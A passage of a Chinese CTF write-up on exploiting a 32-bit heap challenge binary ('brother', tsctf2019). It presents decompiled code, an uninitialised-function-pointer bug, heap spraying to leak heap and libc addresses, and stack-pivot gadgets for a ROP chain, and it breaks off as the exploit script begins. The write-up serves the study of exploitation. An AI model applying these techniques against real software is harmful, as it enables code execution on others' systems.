      v6 = 0;
      while ( v6  0xFFF || end_index > 0xFFF )
        return puts("Index error!");
      for ( i = start_index; ; ++i )
      {
        result = i;
        if ( i > end_index )
          break;
        printf("Notes are : %s\n", dword_4060[2 * i]);
      }
      return result;
    }
Delete函数根据`dword_4008`的值释放`0x10`个堆块并且将对应位置的`notes[idx]`清空。
    int Delete()
    {
      int i; // [esp+8h] [ebp-10h]
      int v2; // [esp+Ch] [ebp-Ch]
      v2 = dword_4008;
      if ( dword_4008  0xFF )
        return puts("Delete error!");
      for ( i = 16 * dword_4008; 16 * (v2 + 1) > i; ++i )
      {
        free((void *)dword_4060[2 * i]);
        dword_4060[2 * i] = 0;
      }
      --dword_4008;
      return puts("Delete success!");
    }
Modify函数对于指定`index`的堆块进行编辑。
    int Modify()
    {
      unsigned int v1; // ST1C_4
      unsigned int v2; // [esp+8h] [ebp-10h]
      printf("Please input index : ");
      v2 = read_choice();
      if ( v2 > 0xFFF || !dword_4060[2 * v2] )
        return puts("Index error!");
      v1 = strlen((const char *)dword_4060[2 * v2]) + 1;
      printf("Please enter the note : ");
      read_str(dword_4060[2 * v2], v1);
      return puts("Edit success!");
    }
CallFuc这个函数检查`note[idx]`这个chunk的最后四个字节`v2`，如果`v2`这个地址的值`val`不为0就`--*v2`，指针值自减一；否则调用`*(v2+4)()`
    int CallFuc()
    {
      int v1; // [esp+8h] [ebp-10h]
      int v2; // [esp+Ch] [ebp-Ch]
      printf("Please input index : ");
      v1 = read_choice();
      if ( v1  0xFFF || !dword_4060[2 * v1] )
        return puts("Index error!");
      v2 = *(_DWORD *)(dword_4060[2 * v1] + dword_4060[2 * v1 + 1]);
      if ( *(_DWORD *)v2 )
        --*(_DWORD *)v2;
      else
        (*(void (**)(void))(v2 + 4))();
      return puts("Call success!");
    }
### 漏洞利用
这里的漏洞在`Create`函数里，在选择`type`的时候一旦我们没有选择`1-4`，就会直接返回，不再赋值函数指针，这就导致堆上对应的部分可能残存了之前堆块的信息，之后在`CallFuc`中处理的函数指针是可控的。
虽然可以控制这个指针`v2`，但是由于开了`PIE`以及输入`零字符截断`，我们不能通过传统方式泄露堆地址和libc地址，这里用到的就是`堆喷`的思想，我们在gdb中多次调试会发现`heap`的地址总是`0x57*`或者`0x56*`，这意味着如果我们申请足够大的内存空间(如`0x20000000`)，那么堆地址就会变成`0x56*-0x58*`，`0x57*`里是一定有值的，此时我们将`v2`设置为`0x57*`不会出现内容引用错误，那么我们如果事先在这块内存上布置好数据，通过指针引用的减一功能，对其中某块数据减一，最后再输出，就可以判断是在哪块内存做了修改，进而判断这块内存地址(通过这个固定内存地址-输出中特殊字符相对于开始的位置offset)。
这里还有一个问题就是一个大区块中的16个小区块分布是随机的，并不是按照地址递增顺序从前到后依次排布，这就导致我们无法衡量之前计算得到的这块内存地址距离开始分配内存的`heap_start`之间的距离。这里有朋友可能想到根据堆排布用`1/16`的概率爆破，但是这条路已经被出题人想到并堵死了，在`Init`函数里先用堆分配了一块`随机大小`的内存，导致堆的排布并不是完全可控的。
继续思考，虽然一个大区块的0x10个小堆块分布随机，但是由于每个大区块分配的总数是一定的我们可以根据刚才找到的小堆块挨个前推，一直找到大区块的起始位置，这个位置不具有随机性，进而可以推断出`heap_start_addr`。
堆地址泄露之后我们可以将`v2`指向一个分配到`unsorted
bin`的`chunk`部分写，用指针减一功能将`\x00`改为`\xff`，进而绕过零字符截断，输出`main_arena`相关地址泄露`libc_base`。
    /*
    gdb-peda$ vmmap
    Start      End        Perm      Name
    0x5658e000 0x56591000 r-xp      /home/wz/Desktop/CTF/tsctf2019/brother/brother
    0x56591000 0x56592000 r--p      /home/wz/Desktop/CTF/tsctf2019/brother/brother
    0x56592000 0x56593000 rw-p      /home/wz/Desktop/CTF/tsctf2019/brother/brother
    0x56593000 0x5659b000 rw-p      mapped
    0x5811c000 0x5813e000 rw-p      [heap]
    0xf7dcc000 0xf7dcd000 rw-p      mapped
    0xf7dcd000 0xf7f7d000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
    0xf7f7d000 0xf7f7f000 r--p      /lib/i386-linux-gnu/libc-2.23.so
    0xf7f7f000 0xf7f80000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
    0xf7f80000 0xf7f83000 rw-p      mapped
    0xf7fa0000 0xf7fa1000 rw-p      mapped
    0xf7fa1000 0xf7fa4000 r--p      [vvar]
    0xf7fa4000 0xf7fa6000 r-xp      [vdso]
    0xf7fa6000 0xf7fc9000 r-xp      /lib/i386-linux-gnu/ld-2.23.so
    0xf7fc9000 0xf7fca000 r--p      /lib/i386-linux-gnu/ld-2.23.so
    0xf7fca000 0xf7fcb000 rw-p      /lib/i386-linux-gnu/ld-2.23.so
    0xff7dd000 0xff7ff000 rw-p      [stack]
    */
    unsigned int Init()
    {
      int v0; // eax
      unsigned int result; // eax
      unsigned int buf; // [esp+4h] [ebp-14h]
      int fd; // [esp+8h] [ebp-10h]
      unsigned int v4; // [esp+Ch] [ebp-Ch]
      v4 = __readgsdword(0x14u);
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 2, 0);
      alarm(0x12Cu);
      fd = open("/dev/urandom", 0);
      read(fd, &buf, 4u);
      srand(buf);
      v0 = rand();
      malloc(4 * (v0 % 0x810));
      result = __readgsdword(0x14u) ^ v4;
      if ( result )
        chunk_faile();
      return result;
    }
现在我们有了libc地址就可以使用libc中的`gadget`了，我们将`v2`改为堆地址`heap_addr`，在满足`*heap_addr ==
0`的条件下可以调用`*(v2+4)`上的`gadget`，经过测试发现`one_gadget`使用条件均不满足，需要自己构造`rop`。
观察CallFuc的调用部分，可以看到`.text:0000131D mov ecx,
[eax+edx*8]`将堆地址放在了`ecx`寄存器中且后续没有更改寄存器值，我们希望将栈迁移到堆，因此只要想办法将`ecx`的值放进`esp`里即可。
这里寻找了两个特殊的`gadget`，首先执行第一个`gadget`让`eax`和`ecx`寄存器的值互换然后调用`[*heap_addr]`，我们在堆块头部放第二个`gadget`，执行这个`gadget`会让`eax`与`esp`寄存器值互换，pop掉无用数据,`ret`的时候触发`rop
chain`
    .text:00001314 loc_1314:                               ; CODE XREF: CallFuc+4A↑j
    .text:00001314                 lea     eax, (dword_4060 - 3F98h)[ebx]
    .text:0000131A                 mov     edx, [ebp+var_10]
    .text:0000131D                 mov     ecx, [eax+edx*8]
    .text:00001320                 lea     eax, (dword_4060 - 3F98h)[ebx]
    .text:00001326                 mov     edx, [ebp+var_10]
    .text:00001329                 mov     eax, [eax+edx*8+4]
    .text:0000132D                 add     eax, ecx
    .text:0000132F                 mov     eax, [eax]
    .text:00001331                 mov     [ebp+var_C], eax
    .text:00001334                 mov     eax, [ebp+var_C]
    .text:00001337                 mov     eax, [eax]
    .text:00001339                 test    eax, eax
    .text:0000133B                 jnz     short loc_1347
    .text:0000133D                 mov     eax, [ebp+var_C]
    .text:00001340                 mov     eax, [eax+4]
    .text:00001343                 call    eax
    .text:00001345                 jmp     short loc_1354
    /*
    magic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword
    ptr [eax]
    magic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;
    mov esi, eax ; add esp, 0x14 ; mov eax, esi ; pop ebx ; pop esi ; ret
### exp.py
这里给的exp是`w1tcher`师傅赛后给的官方exp。较为复杂，建议中间多加断点进行调试，需要注意的几个点：
  1. 这里通过先分配n个堆块再释放再申请n个小堆块的方式进行堆风水排布以及`v2`指针的控制
  2. 选取的地址为`0x58585858`，第一步通过输出判断`0x58585858`这个地址在我们分配的哪个`notes[idx]`的哪个`offset`处，之后根据这个设定范围，向后搜索离其最近的一个大区块的最后一个区块(这里的`最后`指的是分配的`堆地址的最大`的那一个而不是bss上这个区块里`idx`最大的那个)，最终根据偏移计算出`heap_start_addr(开始分配堆块的起始地址)`
    from pwn import *
    import string
    import os
    from hashlib import sha256
    context(arch = 'i386', os = 'linux', endian = 'little')
    context.log_level = 'info'
    context.terminal = ['tmux', 'split', '-h']
    '''